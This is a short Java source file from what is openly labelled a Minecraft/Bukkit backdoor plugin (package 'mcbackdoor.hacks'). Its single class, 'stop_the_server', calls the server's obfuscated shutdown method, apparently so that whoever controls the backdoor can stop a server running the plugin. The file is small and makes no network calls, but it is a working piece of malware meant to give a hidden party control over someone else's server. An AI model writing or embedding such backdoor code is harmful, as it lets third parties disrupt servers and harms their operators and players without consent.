/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

package org.martin.bukkit.mcbackdoor.hacks;

import net.minecraft.server.MinecraftServer;

/**
 *
 * @author Kekec852
 */
public class stop_the_server {
    public static void stopServer(MinecraftServer mcServer){
        mcServer.a();
    }
}
